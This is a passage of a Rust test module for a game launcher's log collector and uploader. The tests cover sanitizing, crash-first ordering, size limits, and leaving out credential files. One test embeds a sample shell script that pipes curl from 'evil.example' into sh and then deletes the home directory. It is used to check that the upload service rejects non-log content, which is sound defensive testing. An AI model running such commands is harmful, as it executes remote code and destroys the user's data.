        assert_eq!(clean, "a?[31mred?x?y??z\nnext Jürgen 日本\n?? end\r\n");
        assert!(clean.chars().all(|c| c == '\r' || keeps(c)));
    }

    #[test]
    fn leaves_long_base64_out_and_breaks_long_lines() {
        let blob = "QUJD".repeat(300);
        let clean = sanitize(format!("token {blob} end\n").as_bytes());
        assert_eq!(clean, "token [1200 base64 characters left out] end\n");
        let short = "QUJD".repeat(10);
        assert_eq!(sanitize(short.as_bytes()), short);
        let long = "a b ".repeat(MAX_LINE);
        let clean = sanitize(long.as_bytes());
        assert!(clean.split('\n').all(|l| l.len() <= MAX_LINE));
        assert_eq!(clean.replace('\n', ""), long);
    }

    #[test]
    fn keeps_the_newest_part() {
        assert_eq!(tail(b"one\ntwo\nthree\n", 100), b"one\ntwo\nthree\n");
        assert_eq!(tail(b"one\ntwo\nthree\n", 9), b"three\n");
        assert_eq!(tail_str("one\ntwo\nthree\n", 9), "three\n");
        // No line to start at, and a character cut through: from the next character.
        assert_eq!(tail_str("ääää", 5), "ää");
    }

    #[test]
    fn reads_the_services_limits() {
        let ok = serde_json::json!({"max_files": 512, "max_body": 64 << 20, "max_file": 8 << 20});
        assert_eq!(
            Limits::from_json(&ok),
            Some(Limits {
                max_files: 512,
                max_body: 64 << 20,
                max_file: 8 << 20
            })
        );
        for bad in [
            serde_json::json!({"error": "Only uploads from the launcher."}),
            serde_json::json!({"max_files": 0, "max_body": 64 << 20, "max_file": 8 << 20}),
            serde_json::json!({"max_files": 512, "max_body": 10, "max_file": 8 << 20}),
            serde_json::json!({"max_files": 512, "max_body": 2 << 20, "max_file": 8 << 20}),
        ] {
            assert_eq!(Limits::from_json(&bad), None, "{bad}");
        }
        assert_eq!(Limits::FALLBACK.max_files, 24);
        assert!(Limits::FALLBACK.budget() >= 32 << 20);
    }

    fn write(path: &Path, text: &str) {
        std::fs::create_dir_all(path.parent().unwrap()).unwrap();
        std::fs::write(path, text).unwrap();
    }

    fn age(path: &Path, days: u64) {
        let f = std::fs::File::options().write(true).open(path).unwrap();
        f.set_modified(SystemTime::now() - Duration::from_secs(days * 24 * 3600))
            .unwrap();
    }

    fn version(root: &Path) -> InstalledVersion {
        write(
            &root.join(paths::ARENA_DIR).join("bin/win10/echovr.exe"),
            "MZ",
        );
        InstalledVersion {
            id: "pc-latest".into(),
            root: paths::normalize(&root.to_string_lossy()),
            ..Default::default()
        }
    }

    fn names(found: &Found, kind: Kind) -> Vec<&str> {
        let mut n: Vec<&str> = found
            .sources
            .iter()
            .filter(|s| s.kind == kind)
            .map(|s| s.name.as_str())
            .collect();
        n.sort();
        n
    }

    fn text(b: &Bundle) -> String {
        String::from_utf8(b.bytes.clone()).unwrap()
    }

    /// Every log of the last two weeks, from every place, no group capped.
    #[test]
    fn collects_every_kind_and_bundles_them() {
        let dir = tempfile::tempdir().unwrap();
        let logs = dir.path().join("logs");
        write(
            &logs.join("EchoVR_Launcher.log"),
            "2026-10-03T10:00:00Z  INFO hi\n",
        );
        write(&logs.join("play.log"), "");
        let root = dir.path().join("pc");
        let v = version(&root);
        let bin = v.bin_dir();
        write(&bin.join("EchoXR/launcher.log"), "===== launch =====\n");
        let r14 = root.join(paths::ARENA_DIR).join("_local/r14logs");
        for i in 0..7 {
            write(
                &r14.join(format!("[r14]-{i}.log")),
                &format!("[10-03-2026] [10:00:0{i}]: x\n"),
            );
        }
        write(
            &bin.join("logs/nevr-boot.jsonl"),
            "{\"msg\":\"[NEVR.BOOT] up\"}\n",
        );
        let local = dir.path().join("local");
        let nevr_logs = local.join("nevr/echovr/logs");
        for i in 0..30 {
            write(
                &nevr_logs.join(format!("nevr-2026-10-04T10-00-{i:02}.000.jsonl")),
                "{\"run\":\"1-a\",\"msg\":\"x\"}\n",
            );
        }
        write(
            &nevr_logs.join("nevr-bootstrap.jsonl"),
            "{\"event\":\"versions\"}\n",
        );
        write(&local.join("EchoVR/logs/nevr-crash-9-z.txt"), "crash\n");
        write(
            &local.join("EchoVR/logs/MOVED-TO-NEVR-ROOT.txt"),
            "Moved to C:\\users\\steamuser\\AppData\\Local\\nevr\\echovr\\logs\n",
        );
        write(
            &local.join("EchoVR/logs/.credentials.json"),
            "{\"refresh_token\":\"x\"}\n",
        );
        write(
            &local.join("nevr/echovr/.credentials.json"),
            "{\"refresh_token\":\"x\"}\n",
        );
        write(
            &bin.join("plugin_logs/EchoCombat/CombatBots/CombatBots.log"),
            "bots\n",
        );
        write(
            &bin.join("plugin_logs/NvrAssetPatches/NvrAssetPatches.log"),
            "plugin says hi\n",
        );
        write(
            &bin.join("plugin_logs/NvrAssetPatches/patch.bin"),
            "not a log\n",
        );
        write(
            &logs.join("quest/2026-10-03_10-00-00/r14logs/a.log"),
            "quest\n",
        );
        let found = collect_from(
            &logs,
            &nevr::log_places_in(&local, &local.join("Temp"), ""),
            &[v],
            &[],
            SystemTime::now(),
        );
        assert_eq!(
            names(&found, Kind::Launcher),
            ["EchoVR_Launcher.log"],
            "the empty play.log is left out"
        );
        assert_eq!(names(&found, Kind::EchoXr), ["pc-latest.launcher.log"]);
        assert_eq!(names(&found, Kind::Echo).len(), 7);
        assert_eq!(names(&found, Kind::Quest), ["quest.r14logs.a.log"]);
        let plugin = names(&found, Kind::Plugin);
        assert_eq!(plugin.len(), 30 + 5, "{plugin:?}");
        for n in [
            "root.logs.nevr-bootstrap.jsonl",
            "EchoVR.logs.nevr-crash-9-z.txt",
            "pc-latest.logs.nevr-boot.jsonl",
            "pc-latest.plugin_logs.EchoCombat.CombatBots.CombatBots.log",
            "pc-latest.plugin_logs.NvrAssetPatches.NvrAssetPatches.log",
        ] {
            assert!(plugin.contains(&n), "{n}: {plugin:?}");
        }
        assert!(!plugin
            .iter()
            .any(|n| n.contains("credentials") || n.contains("patch.bin")));

        let b = bundle(&found.sources, &found.skipped, &Limits::FALLBACK).unwrap();
        let t = text(&b);
        assert!(
            t.starts_with("ECHOVR-LOGS 1\nFILE launcher/upload-index.txt "),
            "{}",
            &t[..200]
        );
        assert!(t.contains("FILE echoxr/pc-latest.launcher.log 19\n===== launch =====\n"));
        assert!(t.ends_with("END\n"));
        assert_eq!(t.matches("\nFILE ").count(), Limits::FALLBACK.max_files);
        assert_eq!((b.sent, b.found), (23, found.sources.len()));
        // The ones that didn't fit are named, with why.
        assert!(t.contains("over the service's limit of 24 files"), "{t}");
        // Every index line starts with a time, as a log line does (the service's rule).
        let index = t.split("\nFILE ").nth(1).unwrap();
        for l in index.lines().skip(1) {
            assert!(
                l.as_bytes()[..4].iter().all(u8::is_ascii_digit) && &l[10..11] == "T",
                "{l}"
            );
        }
    }

    /// A crash and the log of its start go first, whatever came after them; the rest is
    /// named in the index. No more files than the service takes.
    #[test]
    fn sends_a_crash_and_its_start_first_within_the_limit() {
        let dir = tempfile::tempdir().unwrap();
        let local = dir.path().join("local");
        let logs = local.join("nevr/echovr/logs");
        let crashed = logs.join("nevr-2026-10-31T00-00-45.000.jsonl");
        write(
            &crashed,
            "{\"ts\":\"2026-10-31T00:00:45Z\",\"run\":\"68c0-1dd68cae112e7c4\",\"msg\":\"x\"}\n",
        );
        age(&crashed, 1);
        let record = logs.join("nevr-crash-68c0-1dd68cae112e7c4.txt");
        write(
            &record,
            "[NEVR.CRASH] crash record run=68c0-1dd68cae112e7c4\n",
        );
        age(&record, 1);
        write(
            &local
                .join("nevr/echovr/crashes/nevr-crash-68c0-1dd68cae112e7c4-1.report.txt.rejected"),
            "report\n",
        );
        write(&local.join("nevr/echovr/crashes/nevr-1234-1.dmp"), "MDMP");
        for i in 0..100 {
            write(
                &logs.join(format!(
                    "nevr-2026-10-31T01-{:02}-{:02}.000.jsonl",
                    i / 60,
                    i % 60
                )),
                &format!("{{\"run\":\"{i}-b\"}}\n"),
            );
        }
        let old = logs.join("nevr-2026-10-01T00-00-00.000.jsonl");
        write(&old, "{}\n");
        age(&old, 20);
        let found = collect_from(
            &dir.path().join("logs"),
            &nevr::log_places_in(&local, &local.join("Temp"), ""),
            &[],
            &[],
            SystemTime::now(),
        );
        assert_eq!(
            found.sources[..3]
                .iter()
                .filter(|s| s.rank == Rank::Crash)
                .count(),
            3
        );
        let limits = Limits {
            max_files: 24,
            ..Limits::FALLBACK
        };
        let b = bundle(&found.sources, &found.skipped, &limits).unwrap();
        let t = text(&b);
        assert_eq!(t.matches("\nFILE ").count(), 24);
        assert_eq!(b.sent, 23);
        assert!(t.contains("\nFILE plugin/root.logs.nevr-crash-68c0-1dd68cae112e7c4.txt "));
        assert!(t.contains("\nFILE plugin/root.logs.nevr-2026-10-31T00-00-45.000.jsonl "));
        assert!(t.contains(
            "\nFILE plugin/root.crashes.nevr-crash-68c0-1dd68cae112e7c4-1.report.txt.rejected "
        ));
        assert!(t.contains(
            "Crash of start 68c0-1dd68cae112e7c4: plugin/root.logs.nevr-crash-68c0-1dd68cae112e7c4.txt; the start's log: plugin/root.logs.nevr-2026-10-31T00-00-45.000.jsonl"
        ), "{t}");
        assert_eq!(
            t.matches("over the service's limit of 24 files").count(),
            102 - 22
        );
        assert!(t.contains(
            "not sent plugin/root.crashes.nevr-1234-1.dmp 4 bytes: a crash dump, never sent"
        ));
        assert!(t.contains("not sent plugin/root.logs.nevr-2026-10-01T00-00-00.000.jsonl 3 bytes: older than 14 days"));
        assert!(!t.contains("MDMP"));
    }

    /// nEVR 6.x's folders besides its root's logs, and a Server host server's own.
    #[test]
    fn finds_nevr_6s_every_folder() {
        let dir = tempfile::tempdir().unwrap();
        let local = dir.path().join("local");
        let temp = local.join("Temp");
        write(
            &local.join("nevr/echovr/crashes/nevr-host-31568-1a2b-1.report.txt"),
            "host\n",
        );
        write(&temp.join("nevr/echovr/logs/nevr-bootstrap.jsonl"), "{}\n");
        write(
            &local.join("nevr/installer/logs/nevr-install.jsonl"),
            "{}\n",
        );
        write(
            &local.join("nevr/echovr/plugin_logs/NvrContentOverlay/NvrContentOverlay.log"),
            "overlay\n",
        );
        let v = version(&dir.path().join("pc"));
        write(&v.bin_dir().join("nevr-31568-1.txt"), "fallback\n");
        write(&v.bin_dir().join("BugSplat64.dll"), "MZ");
        let server = dir.path().join("servers/echo-1");
        write(&server.join("console.log"), "console\n");
        let server_bin =
            crate::core::server_host::farm::bin_in(&crate::core::server_host::farm_root(&server));
        write(&server_bin.join("logs/nevr-boot.jsonl"), "{}\n");
        let server_local = dir.path().join("server-local");
        write(
            &server_local.join("nevr/echovr/logs/nevr-2026-10-31T00-00-00.000.jsonl"),
            "{}\n",
        );
        let mut places = nevr::log_places_in(&local, &temp, "");
        places.extend(nevr::log_places_in(&server_local, &temp, "server-echo-1."));
        let found = collect_from(
            &dir.path().join("logs"),
            &places,
            &[v],
            &[ServerLogs {
                name: "echo-1".into(),
                dir: server,
            }],
            SystemTime::now(),
        );
        assert_eq!(
            names(&found, Kind::Plugin),
            [
                "installer.logs.nevr-install.jsonl",
                "pc-latest.nevr-31568-1.txt",
                "root.crashes.nevr-host-31568-1a2b-1.report.txt",
                "root.plugin_logs.NvrContentOverlay.NvrContentOverlay.log",
                "server-echo-1-console.log",
                "server-echo-1.logs.nevr-boot.jsonl",
                "server-echo-1.root.logs.nevr-2026-10-31T00-00-00.000.jsonl",
                "temp.logs.nevr-bootstrap.jsonl",
            ]
        );
    }

    /// Over the byte budget the last ones give way first, a crash's last; never more than
    /// the service takes.
    #[test]
    fn trims_the_last_first_over_the_budget() {
        let dir = tempfile::tempdir().unwrap();
        let line = "x".repeat(99) + "\n";
        let put = |name: &str, kb: usize, days: u64| {
            let p = dir.path().join(name);
            write(&p, &line.repeat(kb * 10));
            age(&p, days);
            p
        };
        let crash = put("nevr-crash-1-a.txt", 600, 3);
        let newest = put("new.log", 600, 0);
        let older = put("old.log", 600, 2);
        let source = |path: PathBuf, rank| Source {
            kind: Kind::Plugin,
            name: path.file_name().unwrap().to_string_lossy().into_owned(),
            bytes: 600_000,
            modified: modified(&path).unwrap(),
            path,
            rank,
            run: None,
        };
        let sources = [
            source(older, Rank::Rest),
            source(crash, Rank::Crash),
            source(newest, Rank::Rest),
        ];
        let limits = Limits {
            max_files: 10,
            max_body: INDEX_MAX + 1_000_000 + 10 * 160 + 4096,
            max_file: 8 << 20,
        };
        let b = bundle(&sources, &[], &limits).unwrap();
        assert!(b.bytes.len() <= limits.max_body, "{}", b.bytes.len());
        let t = text(&b);
        assert!(t.contains("FILE plugin/nevr-crash-1-a.txt 600000\n"));
        let sent: usize = t
            .split("FILE plugin/new.log ")
            .nth(1)
            .and_then(|r| r.split('\n').next()?.parse().ok())
            .unwrap();
        assert!((399_000..=400_000).contains(&sent), "{sent}");
        assert!(!t.contains("FILE plugin/old.log"));
        assert!(t.contains("left out plugin/old.log 600.0 KB: over the service's size limit"));
        assert!(t.contains("trimmed  plugin/new.log 399.9 KB of 600.0 KB (its newest part)"));
    }

    /// Bundled and sent to a local service:
    /// `python log_upload.py --no-clamd --no-echovrce` (port 8787), then
    /// `ECHOVR_LOG_UPLOAD_URL=http://127.0.0.1:8787/launcher/logs cargo test uploads -- --ignored`.
    #[test]
    #[ignore = "needs a local log upload service"]
    fn uploads_to_the_service() {
        let found = collect(&[]);
        assert!(!found.sources.is_empty(), "no launcher logs here");
        let limits = limits();
        assert_ne!(
            limits,
            Limits::FALLBACK,
            "the service didn't say its limits"
        );
        let who = Uploader {
            // The service takes a bearer of 20 characters or more.
            token: "dev-token-for-a-local-service".into(),
            oid: Some("OVR-ORG-123".into()),
            report: None,
        };
        let b = bundle(&found.sources, &found.skipped, &limits).unwrap();
        let code = upload(b.bytes, &who).unwrap();
        assert_eq!(code.len(), 8, "{code}");
        // Not a log: refused, with the service's own words.
        let script = "#!/bin/sh\nset -e\ncurl -s http://evil.example/x | sh\nrm -rf \"$HOME\"\n";
        let body = format!(
            "ECHOVR-LOGS 1\nFILE launcher/a.log {}\n{script}END\n",
            script.len()
        );
        let err = upload(body.into_bytes(), &who).unwrap_err().to_string();
        assert!(err.contains("doesn't look like a log"), "{err}");
    }
}
